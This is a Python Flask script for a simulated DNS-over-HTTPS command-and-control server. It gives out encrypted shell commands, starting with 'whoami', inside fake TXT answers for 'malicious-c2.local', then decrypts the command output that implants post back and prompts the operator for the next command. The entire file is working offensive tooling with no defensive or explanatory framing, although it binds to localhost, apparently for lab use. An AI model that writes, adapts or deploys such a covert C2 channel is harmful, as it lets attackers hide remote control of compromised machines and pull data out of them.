from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import base64

app = Flask(__name__)

KEY = b'6c-vH-wE6Xm2K6R9qV6X4pZaBcDEfGhIjKlMnOpQrSt='
fernet = Fernet(KEY)

current_command = "whoami"

@app.route('/dns-query', methods=['GET'])
def dns_query():
    global current_command
    if current_command != "NONE":
        encrypted_cmd = fernet.encrypt(current_command.encode())
        encoded_cmd = base64.b64encode(encrypted_cmd).decode()
        payload = f'"{encoded_cmd}"'
    else:
        payload = '"NONE"'

    dns_response = {
        "Status": 0,
        "TC": False,
        "RD": True,
        "RA": True,
        "Question": [{"name": "malicious-c2.local", "type": 16}],
        "Answer": {
            "name": "malicious-c2.local",
            "type": 16,
            "TTL": 60,
            "data": payload
        }
    }
    current_command = "NONE"
    return jsonify(dns_response)

@app.route('/results', methods=['POST'])
def receive_results():
    data = request.json
    encoded_output = data.get('output')
    try:
        encrypted_output = base64.b64decode(encoded_output)
        decrypted_output = fernet.decrypt(encrypted_output).decode()
        print(f"\n[+] Decrypted Command Output:\n{decrypted_output}")
    except Exception as e:
        print(f"\n[-] Error Decrypting: {e}")
    global current_command
    current_command = input("Next Command> ")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    print("[*] DoH-Simulated C2 Server Started on http://localhost:5000")
    app.run(host='localhost', port=5000)
